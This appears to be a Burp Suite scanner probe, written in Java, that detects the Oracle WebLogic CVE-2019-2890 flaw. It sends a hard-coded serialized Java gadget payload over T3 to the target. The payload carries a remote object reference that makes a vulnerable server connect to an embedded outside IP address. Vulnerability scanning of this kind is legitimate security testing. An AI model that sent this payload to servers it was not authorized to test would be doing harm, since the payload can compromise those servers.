package probes;

import burp.IHttpRequestResponse;
import burp.IScanIssue;
import burp.Utilities;
import burp.WebLogicIssue;

import java.io.IOException;
import java.net.Socket;
import java.net.URL;
import java.util.regex.Pattern;

public class CVE_2019_2890 extends Probe {
    private static final String NAME = "CVE-2019-2890";
    private static final String SEVERITY = "High";
    private static final String DESC = "Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Web Services). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0 and 12.2.1.3.0. Easily exploitable vulnerability allows high privileged attacker with network access via T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.0 Base Score 7.2 (Confidentiality, Integrity and Availability impacts).";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        URL target = Utilities.helpers.analyzeRequest(requestResponse).getUrl();
        Pattern p = Pattern.compile("\\$Proxy[0-9]+");
        // todo: PersistentContext在序列化时遇到空指针异常，暂时用hex字符串代替
        byte[] payload = Utilities.hexToBytes("aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078");
        String result = "";
        try {
            Socket s = new Socket(target.getHost(), target.getPort());
            s.setSoTimeout(10);
            result = sendT3Payload(s, payload);
            s.close();
        } catch (IOException e) {
            e.printStackTrace(Utilities.err);
        }

        if (p.matcher(result).find()) {
            return new WebLogicIssue(requestResponse, NAME, DESC, SEVERITY);
        } else return null;
    }
}
